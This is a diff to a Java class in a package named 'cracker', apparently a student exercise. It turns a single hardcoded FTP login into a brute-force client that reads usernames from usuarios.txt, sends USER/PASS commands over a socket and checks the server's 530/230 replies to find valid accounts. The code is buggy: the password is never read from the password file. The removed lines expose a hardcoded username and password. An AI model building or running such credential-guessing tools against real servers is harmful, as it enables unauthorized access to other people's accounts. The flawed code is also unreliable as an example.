@@ -4,21 +4,14 @@
  */
 package cracker;
 
-import java.io.BufferedReader;
-import java.io.BufferedWriter;
-import java.io.DataOutputStream;
+import java.io.File;
 import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.net.Socket;
-import java.net.UnknownHostException;
-import java.util.Iterator;
 import java.util.LinkedList;
-import java.util.List;
+import java.util.Scanner;
 import java.util.logging.Level;
 import java.util.logging.Logger;
-import java.util.stream.Stream;
 
 /**
  *
@@ -30,6 +23,7 @@ public class Escribir extends Thread {
     LinkedList<String> mensajes;
     boolean cierre = false;
     String mensaje = "";
+    
     int id = 0;
     Escribir() {
 
@@ -40,10 +34,18 @@ public class Escribir extends Thread {
         this.mensajes = mensajes;
     }
 
-    public void run() {
+    public void run(){
         String respuesta = "";
-
+        String user = "";
+        String pass = "";
+        try{
+        Scanner sc = new Scanner(new File("usuarios.txt"));
+        Scanner sc2 = new Scanner(new File("claves.txt"));
+        while(sc.hasNext()){
+                user = sc.nextLine();            
+        
         while (!cierre) {
+            
             try {
 
                 while (mensajes.size() > 0) {
@@ -54,7 +56,8 @@ public class Escribir extends Thread {
                 PrintWriter escribir = new PrintWriter(socket.getOutputStream());
 
                 if (mensajes.size() <= 0) {
-                    escribir.println("user dam2");
+                    escribir.println("user " + user);
+                    System.out.println("usuario " + user);
                     escribir.flush();
                     
                     System.out.println(mensajes);
@@ -65,7 +68,8 @@ public class Escribir extends Thread {
                     mensaje = mensajes.pop();
                     if (mensaje.contains("331")) {
                         System.out.println("Hola22");
-                        escribir.println("pass PR0GR4M4");
+                        System.out.println("usuario 2" + user);
+                        escribir.println("pass " + pass);
                         escribir.flush();
 
                     }
@@ -77,7 +81,7 @@ public class Escribir extends Thread {
                     mensaje = mensajes.pop();
                     System.out.println("prueba " + id + " "+ mensaje);
                     if (mensaje.contains("530")) {
-                        
+                        System.out.println("entro 530 " + id );
                         cierre = true;
                         socket.close();
                     } else if (mensaje.contains("230")) {
@@ -91,6 +95,10 @@ public class Escribir extends Thread {
                 Logger.getLogger(Escribir.class.getName()).log(Level.SEVERE, null, ex);
             }
         id++;
+        }
+        }
+        }catch(Exception e){
+                e.getStackTrace();
         }
 
     }
